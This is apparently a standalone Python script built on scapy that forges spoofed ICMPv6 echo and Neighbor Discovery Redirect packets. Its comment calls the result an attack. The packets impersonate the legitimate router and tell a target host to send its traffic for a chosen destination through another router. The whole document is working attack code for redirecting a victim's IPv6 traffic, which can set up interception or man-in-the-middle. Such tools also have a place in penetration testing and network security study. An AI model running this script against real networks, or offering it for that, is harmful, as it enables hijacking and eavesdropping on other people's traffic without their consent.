#!/usr/bin/python
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply, ICMPv6ND_Redirect, ICMPv6NDOptDstLLAddr, \
    ICMPv6NDOptRedirectedHdr
from scapy.sendrecv import send


def redirect(interface, sip, dip, old_router, new_router, mac_router):
    # Generate ICMPv6 Request
    data = 16 * "A"
    base_1 = IPv6()
    base_1.src = dip
    base_1.dst = sip
    packet1 = base_1 / ICMPv6EchoRequest(data=data)

    # Generate ICMPv6 Reply
    base_2 = IPv6()
    base_2.src = sip
    base_2.dst = dip
    packet2 = base_2 / ICMPv6EchoReply(data=data)

    # Generate Redirect, but we need two previous messages to succeed in attack
    base_3 = IPv6()
    base_3.src = old_router
    base_3.dst = sip

    packet3 = base_3 / ICMPv6ND_Redirect(tgt=new_router, dst=dip) / \
              ICMPv6NDOptDstLLAddr(lladdr=mac_router) / \
              ICMPv6NDOptRedirectedHdr(pkt=packet2)
    if interface == "":
        send(packet1, verbose=False)
        send(packet2, verbose=False)
        send(packet3, verbose=False)
    else:
        send(packet1, verbose=False, iface=interface)
        send(packet2, verbose=False, iface=interface)
        send(packet3, verbose=False, iface=interface)
    print("Redirect message is sent to host: " + sip)
